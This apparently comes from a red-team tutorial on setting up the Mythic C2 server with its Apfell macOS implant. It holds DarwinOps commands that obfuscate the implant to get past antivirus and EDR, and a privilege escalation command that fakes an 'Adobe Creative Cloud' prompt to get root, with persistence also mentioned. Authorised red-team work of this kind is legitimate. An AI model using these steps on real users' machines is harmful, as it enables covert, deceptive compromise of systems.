---
icon: dragon
---

# Setup and weaponize Mythic C2 using DarwinOps to target MacOS

We’ll look at how to set up Mythic C2 and its Apfell implant on MacOS. We will weaponize that implant to bypass EDRs using BallisKit DarwinOps. We will also show how to use the privilege escalation module to gain root access.

**1. Verify Dependencies**

Before starting, make sure you have all the necessary dependencies to build `mythic-cli`:

```
apt install make -y
apt install git -y
```

**2. Download Mythic from GitHub**

Clone the Mythic repository from GitHub and navigate into it:

```
sudo git clone https://github.com/its-a-feature/Mythic.git
cd Mythic
```

**3. Install Docker and Docker Compose**

Mythic requires Docker and Docker Compose to run its services. Use one of the following scripts to install Docker:

* Debian:

```
./install_docker_debian.sh
```

* Kali Linux:

```
./install_docker_kali.sh
```

* Ubuntu:

```
./install_docker_ubuntu.sh
```

**4. Build Mythic-CLI**

To build `mythic-cli`:

```
make
```

If everything goes well, you should have a `./mythic-cli` file ready to use.

**5. Start Mythic**

Now that the script is executed, Mythic is ready to be launched:

```
./mythic-cli start
```

**Tip:** It’s possible that some containers may take time to initialize and communicate with other services. It’s common to see error messages initially; the important part is that _all containers are started_, as shown below:

<figure><img src="https://miro.medium.com/v2/resize:fit:875/1*5fCmqJsFv6K-scqnzhTwQQ.png" alt="" height="250" width="700"><figcaption><p>Image of 10 containers starting</p></figcaption></figure>

**6. Configuration**

All configuration is done through the `.env` file or using the command:

```
./mythic-cli config
```

If the C2 server needs to be accessible remotely, you must execute the following command:

```
./mythic-cli config set mythic_server_bind_localhost_only false && ./mythic-cli restart
```

You can now access the UI panel from your server’s IP address. If you cannot connect, make sure ‘BOUND LOCALLY’ is set to false.

<figure><img src="https://miro.medium.com/v2/resize:fit:875/1*neuMmnzkU2U7Cy1cfqaTVw.png" alt="" height="36" width="700"><figcaption><p>Service run bound locally</p></figcaption></figure>

Access Mythic UI via:

```
https://127.0.0.1:7443/new/login
```

You should see a login panel like the one below:

<figure><img src="https://miro.medium.com/v2/resize:fit:875/1*sY6pvgtzMjwYBSn9ktSisg.png" alt="" height="491" width="700"><figcaption><p>Mythic panel</p></figcaption></figure>

**Username:** `mythic_admin`\
**Password:** The password is automatically generated and can be found in the `.env` file. Alternatively, use the command:

```
grep ^MYTHIC_ADMIN_PASSWORD= .env | cut -d = -f2
```

**7. Installing Payload and C2Profile**

Once logged in, go to the Payloads section:

<figure><img src="https://miro.medium.com/v2/resize:fit:875/1*nYhpivQ2EMwOXM_2vfdUjQ.png" alt="" height="196" width="700"><figcaption><p>Payloads and C2Profiles</p></figcaption></figure>

Currently, nothing is installed. Let’s install our payload and communication channel.

* **Install Apfell**: This is the Mythic payload for macOS that uses JXA:

```
sudo ./mythic-cli install github https://github.com/MythicAgents/apfell
```

* **Install HTTP C2Profile**: To communicate with our implant, install the HTTP C2Profile:

```
sudo ./mythic-cli install github https://github.com/MythicC2Profiles/http
```

You should now see:

<figure><img src="https://miro.medium.com/v2/resize:fit:875/1*DeY9oYfaeNdA1n5G9Z6HRw.png" alt="" height="143" width="700"><figcaption><p>Payload and C2Profiles downloaded</p></figcaption></figure>

**8. Generate Apfell Payload**

To generate an Apfell payload:

<figure><img src="https://miro.medium.com/v2/resize:fit:875/1*8Ckw6YvGkz9zC-u7UMTqow.png" alt="" height="161" width="700"><figcaption><p>Generate new payload</p></figcaption></figure>

* **Select MacOS** (should be the default if Apfell is the only installed payload).
* **Select Apfell** (also default if it’s the only installed payload).
* Add any desired commands (these won’t impact the overall process).

When selecting the C2 Profiles, make sure to **include HTTP**:

<figure><img src="https://miro.medium.com/v2/resize:fit:875/1*IVTCREEIgGkVo2Sp46fpTw.png" alt="" height="91" width="700"><figcaption><p>Add HTTP C2Profile</p></figcaption></figure>

Verify that the parameters match. By default, it’s set to `https://` and port `80`. It won't work if these don't align:

<figure><img src="https://miro.medium.com/v2/resize:fit:875/1*r8xm9Vxj74IY03dxCjc5fQ.png" alt="" height="216" width="700"><figcaption><p>HTTP options</p></figcaption></figure>

Once parameters are entered, you can download the payload:

<figure><img src="https://miro.medium.com/v2/resize:fit:875/1*KJifEb6LiH-TKV9W_5ZXxQ.png" alt="" height="308" width="700"><figcaption><p>Download here</p></figcaption></figure>

**9. Using DarwinOps**

Now that you generated the payload, **the antivirus programs might flag and delete it**. So we need to weaponize it. For that we will rely on DarwinOps, the Redteam toolkit for MacOS!

1. Use the following command line to weaponize the Apfell payload:

```
./darwin_ops -G payload.app -i apfell.js --autopack --obfuscate
```

2\. Execute the generated payload:

```
./in_memory_exec.js
```

<figure><img src="https://miro.medium.com/v2/resize:fit:875/1*d4IcnHVHaE28q_KYhyUhig.png" alt="" height="405" width="700"><figcaption></figcaption></figure>

If you need more privilege, you can use the Privesc module to pass yourself off as a plausible application.

```
./darwin_ops -G privesc.app -i apfell.js --privesc --privesc-delay-execution 10 --privesc-prompt_app_name "Adobe Creative Cloud" --privesc-prompt-app-icon CreativeCloudApp.icns --autopack --obfuscate
```

<figure><img src="https://miro.medium.com/v2/resize:fit:875/1*jW9XJ3wACpgfYjZu44SvKw.png" alt="" height="474" width="700"><figcaption><p>Apple’s native prompt spoofed to be that of an application we’ve chosen, but which will launch our Apfell implant as root</p></figcaption></figure>

<figure><img src="https://miro.medium.com/v2/resize:fit:875/1*6CiONzkwAN3ezAtU2pFEvA.png" alt="" height="375" width="700"><figcaption><p>Apfell implant as root</p></figcaption></figure>

As you can see, we have root access via our implant, and DarwinOps also allows you to add persistence via other modules.



***

## REFERENCES

* [https://blog.balliskit.com/setup-and-weaponize-mythic-c2-using-darwinops-to-target-macos-9c7d45a44d8b](https://blog.balliskit.com/setup-and-weaponize-mythic-c2-using-darwinops-to-target-macos-9c7d45a44d8b)

